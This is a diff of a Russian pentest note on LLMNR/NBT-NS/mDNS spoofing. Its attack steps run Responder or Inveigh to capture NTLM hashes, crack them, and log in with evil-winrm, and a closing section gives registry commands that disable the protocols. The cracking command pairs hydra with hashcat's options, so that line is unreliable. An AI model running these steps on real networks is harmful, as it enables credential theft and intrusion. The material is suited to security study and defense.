@@ -14,7 +14,6 @@
 
 > Устаревший протокол, использующийся для трансляции имен в IP адреса в Windows сетях
 
-
 ### LLMNR (5355 PORT)
 
 > Выполняет разрешение доменных имен в локальных сетях, использует формат DNS
@@ -26,7 +25,6 @@
 
 > Преобразует имена хостов в IP адреса, где нет локального сервера имен
 
-
 ## Проведение атаки
 
  > Пользователь ошибочно вводит неправильное имя по SMB, из-за чего идет разрешение имени через LLMNR/NBT-NS/mDNS.
@@ -34,16 +32,33 @@
  > Мы говорим, что это мы, запрашиваем аутентификацию и получаем креды 
 
 1) Находясь в одной локальной сети с Windows машиной запускаем Responder для отравления протоколов LLMNR/NBNS/mDNS
-		`sudo responder -I eth0 -A -vv`
+
+Responder (linux)
+```bash
+sudo responder -I eth0 -A -vv
+```
+
+Inveigh (Windows)
+```powershell
+Import-Module .\Inveigh.ps1
+
+Invoke-Inveigh Y -LLMNR Y -MDNS Y -NBNS Y <...> -ConsoleOutput Y -FileOutput Y
+
+Stop-Inveight
+```
 
 2) Перехватываем NTLM хэши учетных данных `/usr/share/responder/logs`
 3) Брутим хэш любым инструментов
-	`hydra -a 0 -w 4 -m 5600 {hash.txt} {dict.txt}`
+
+```bash
+hydra -a 0 -w 4 -m 5600 {hash.txt} {dict.txt}
+```
 
 4) Подключаемся к машине с использованием протокола WINRM
-	`evil-winrm -i 192.168.0.100 -u {username} -p {password}`
 
-
+```bash
+evil-winrm -i 192.168.0.100 -u {username} -p {password}
+```
 
 ## Защита от атаки LLMNR/NBT-NS/mDNS Spoofing
 > **Отключение протоколов LLMNR/NBT-NS/mDNS во всей сети**
@@ -56,9 +71,18 @@
 
 ##### Отключение через Реестр
 LLMNR:
-	reg add "HKLM\Software\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast /t REG_DWORD /d 0 /f
+```powershell
+reg add "HKLM\Software\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast /t REG_DWORD /d 0 /f
+```
+	
 NBT-NS:
-	reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters /v NodeType /t REG_DWORD /d 0x8 /f
+```powershell
+reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters /v NodeType /t REG_DWORD /d 0x8 /f
+```
 mDNS:
-	sc stop "Bonjour Service"
-	reg add "HKLM\SYSTEM\CurrentControlSet\Services\Bonjour Service" /v Start /t REG_DWORD /d 4 /f
+```powershell
+sc stop "Bonjour Service"
+
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Bonjour Service" /v Start /t REG_DWORD /d 4 /f
+```
+
